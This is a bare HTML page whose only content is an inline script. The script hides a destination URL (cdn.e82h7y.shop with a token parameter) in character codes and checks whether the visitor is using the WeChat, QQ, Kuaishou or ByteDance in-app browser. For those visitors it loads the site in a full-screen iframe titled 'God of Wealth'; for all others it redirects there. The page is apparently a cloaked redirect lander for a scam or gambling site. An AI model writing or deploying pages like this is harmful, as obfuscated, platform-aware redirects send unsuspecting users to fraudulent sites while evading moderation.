<!DOCTYPE html>
<html lang="zh">
<head>
    <title>
    </title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="referrer" content="no-referrer" />
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
    <script src="https://s4.zstatic.net/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        body,html{width:100%;height:100%}
        *{margin:0;padding:0}
        iframe { width: 100vw; height: 100vh; }
    </style>
</head>
<body>
<script>
var url = window.document.location.href;
console.log(url)
var uu1 = url.split("?");
if(uu1.length == 2) {
    var u = uu1[1].replace("/", ""); 
    var uu = u.replace("token", "").replace("=", ""); 
} else {
    var uu = ""; 
}

$(document).ready(function () {
    var resultUrl = String.fromCharCode(104,116,116,112,115,58,47,47,99,100,110,46,101,56,50,104,55,121,46,115,104,111,112,63,116,111,107,101,110,61) + uu
    var ua = navigator.userAgent.toString(); 
    if (ua.indexOf("MicroMessenger/") !== -1 || ua.indexOf("QQ/") !== -1 || ua.indexOf("Kwai/") !== -1 || ua.indexOf("BytedanceWebview/") !== -1) {
        $("title").text(String.fromCodePoint(0x8d22, 0x795e)); 
        $("body").html('<iframe class="fullscreen-element" src="' + resultUrl + '" width="100%"  style="border: 0" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe>'); 
    } else {
        window.location.href = resultUrl;
    }
});
</script>

</body>
</html>
